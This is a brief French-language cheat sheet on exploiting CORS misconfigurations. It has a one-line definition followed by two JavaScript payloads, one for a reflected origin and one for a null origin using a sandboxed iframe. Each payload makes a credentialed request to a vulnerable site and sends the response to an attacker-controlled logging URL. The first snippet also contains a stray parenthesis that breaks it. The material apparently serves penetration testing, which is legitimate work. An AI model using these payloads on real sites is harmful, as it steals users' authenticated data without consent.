#### Définition
 CORS est un mécanisme qui consiste à transmettre des entêtes HTTP qui déterminent s'il faut ou non bloquer les requêtes à des ressources restreintes sur une page web qui se trouve sur un domaine externe au domaine dont la ressource est originaire

####  Cas de test lorsque `origin = http:site.com` et la réponse de la requête est égale `Access-Control-Allow-Origin: site.com`

```
<script> 
	var req = new XMLHttpRequest(); 
	req.onload = reqListener; req.open('get','site-vulnerable',true);
	req.withCredentials = true; 
	req.send(); 
	function reqListener() { 
		location='ton_site_resultat/log?key='+ 
	this.responseText); 
	};
 </script>
```


#### Cas de test lorsque `origin = null` et la réponse de la requête est égale `Access-Control-Allow-Origin: null`


```
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" srcdoc="<script> 
	var req = new XMLHttpRequest(); 
	req.onload = reqListener; req.open('get','site-vulnerable',true);
	req.withCredentials = true; 
	req.send(); 
	function reqListener() { 
		location='ton_site_resultat/log?key='+encodeURIComponent(this.responseText); 
	};
 </script>">
</iframe>

```